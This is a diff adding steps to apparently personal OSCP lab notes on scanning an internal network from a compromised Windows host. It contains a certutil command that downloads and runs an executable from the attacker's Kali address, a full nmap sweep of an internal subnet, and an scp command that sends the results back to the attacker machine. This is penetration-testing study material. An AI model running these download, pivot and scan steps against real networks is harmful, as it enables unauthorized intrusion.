@@ -151,3 +151,34 @@ For port forwarding techniques using the windows tools plink, and netsh, conside
 ```bash
 for i in $(tail -n 7 0_Hosts); do (mkdir -p "B_$i" && cd $_ && proxychains nmap -Pn --osscan-guess -T 5 -A --top-ports 100 $i -oX - | xsltproc -o 0_overview.html - && firefox 0_overview.html)& done
 ```
+
+> **If you have a windows GUI oder linux CLI and Administrator rights, scan from the remote host itself:**
+
+##### Scan with nmap from Windows
+1. Install nmap, requires GUI
+```powershell
+certutil.exe -urlcache -split -f "http://192.168.45.158:8000/nmap-7.94-win-setup.exe" ; .\nmap-7.94-win-setup.exe
+```
+You can find the installer in `/ftphome/`
+2. Run pingsweep and add new hosts to `/etc/hosts`. Also, add them to `ips.txt` on the windows host 
+```powershell
+& "C:\Program Files (x86)\Nmap\nmap.exe" -sn 172.16.199."1-254" -oG - | findstr "Status: Up"
+```
+3. Run full scan
+   ```powershell
+ForEach ($i in $(Get-Content -Path ips.txt)){& "C:\Program Files (x86)\Nmap\nmap.exe" --osscan-guess -T 5 -A -p- $i -oX "C:\Users\tempadmin\${i}_fullscan.xml" }; 
+ForEach ($i in $(Get-Content -Path ips.txt)){& "C:\Program Files (x86)\Nmap\nmap.exe" -sUV --top-ports 100 $i -oN "C:\Users\tempadmin\0_udp_top100_${i}.txt" }
+```
+4. Zip the resulting files and transfer them to kali, e.g. with:
+```powershell
+scp -i id_rsa_kali transfer.zip kali@192.168.45.158:'/home/kali/oscp/lab/Medtech/A_WEB02/extract'
+```
+5. Unzip the file and move all files to their respective host's folder.
+7. Change the path within the .xml files so that xlstproc can find the nmap stylesheet, then run the latter.
+```bash
+for i in $(find .. -name "*fullscan.xml" | tr '\n' ' '); do \
+cd ../$(echo $i | cut -d '/' -f2); \
+mv 0_overview.html overview_from_A.html.bak; \
+sed -i 's/C:\/Program Files (x86)\/Nmap\/nmap.xsl/usr\/bin\/..\/share\/nmap\/nmap.xsl/g' $i; \
+xsltproc -o 0_overview.html $i; done
+```
